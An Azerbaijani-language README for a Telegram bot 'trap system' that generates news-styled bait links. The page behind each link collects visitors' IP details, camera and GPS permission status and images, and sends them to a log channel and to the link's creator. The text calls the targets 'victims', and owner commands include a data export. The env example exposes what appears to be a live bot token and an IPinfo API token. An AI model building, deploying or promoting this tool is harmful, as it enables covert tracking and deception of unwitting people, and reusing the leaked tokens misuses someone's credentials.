# Python Telegram Bot - Tələ Sistemi

Bu layihə PHP-dən Python-a çevrilmiş Telegram bot sistemidir. Railway platformasında işləyir.

## Xüsusiyyətlər

- ✅ **Telegram Bot**: Tam funksional bot əmrləri
- ✅ **Web Interface**: Qurban məlumatlarını toplayan səhifə
- ✅ **İkili Mesajlaşma**: Log kanal + link yaradıcısına mesaj
- ✅ **Dərhal Bildiriş**: IP məlumatları dərhal göndərilir
- ✅ **Kamera/GPS Aşkarlanması**: İcazə vəziyyəti izlənir
- ✅ **Owner Əmrləri**: Tam idarəetmə sistemi

## Quraşdırma

### 1. Dependency-ləri yükləyin
```bash
pip install -r requirements.txt
```

### 2. Environment dəyişənlərini təyin edin
`.env.example` faylını `.env` olaraq kopyalayın və dəyərləri doldurун:

```env
BOT_TOKEN=8492122796:AAHTB3-EVBPWtLOdjo2aJXOxcqm18K3jkkM
LOG_CHANNEL_ID=-1002939137169
OWNER_ID=7121280299
IPINFO_TOKEN=7e5ce118942708
DOMAIN=takipciaz.com
```

### 3. Botu işə salın
```bash
python main.py
```

## Bot Əmrləri

### İstifadəçi Əmrləri
- `/start` - Bot haqqında məlumat
- `/newurl [ad]` - Yeni tələ linki yaradın
- `/delurl [ad]` - Tələ linkini silin
- `/myurls` - Yaratdığınız linkləri görün

### Owner Əmrləri
- `/master_stats` - Sistem statistikası
- `/master_users` - İstifadəçi siyahısı
- `/master_ban` - İstifadəçini qadağan et
- `/master_unban` - Qadağanı qaldır
- `/master_broadcast` - Toplu mesaj göndər
- `/master_cleanup` - Köhnə məlumatları təmizlə
- `/master_export` - Məlumatları ixrac et
- `/accesid [userid]` - İcazə ver
- `/unacces [userid]` - İcazəni geri al
- `/acceslist` - İcazə siyahısı

## Railway Deployment

### 1. Railway hesabı yaradın
[Railway.app](https://railway.app) saytında hesab yaradın.

### 2. PostgreSQL əlavə edin
Railway dashboard-da PostgreSQL service əlavə edin.

### 3. Environment Variables təyin edin
Railway-də bu dəyişənləri əlavə edin:
- `BOT_TOKEN`
- `LOG_CHANNEL_ID`
- `OWNER_ID`
- `IPINFO_TOKEN`
- `DOMAIN`
- `DATABASE_URL` (PostgreSQL-dən avtomatik gələcək)

### 4. Deploy edin
```bash
railway login
railway link
railway up
```

## Faylların Strukturu

```
python_telegram_bot/
├── main.py              # Əsas işə salma faylı
├── bot.py               # Telegram bot məntiqi
├── web_app.py           # FastAPI web server
├── config.py            # Konfiqurasiya
├── database.py          # Verilənlər bazası modelləri
├── utils.py             # Köməkçi funksiyalar
├── requirements.txt     # Python dependency-ləri
├── railway.json         # Railway konfiqurasiyası
├── templates/
│   └── trap_page.html   # Tələ səhifəsi
├── static/              # Statik fayllar
└── uploads/             # Yüklənən şəkillər
```

## Tələ Linkləri

Sistem bu formatda linklər yaradır:
- `https://takipciaz.com/xeber1`
- `https://takipciaz.com/son_xeber`

## Təhlükəsizlik Qeydləri

⚠️ **DİQQƏT**: Bu sistem sosial mühəndislik məqsədləri üçün nəzərdə tutulub. Yalnız qanuni məqsədlər üçün istifadə edin.

## Dəstək

Hər hansı problem yaşasanız, owner ilə əlaqə saxlayın.
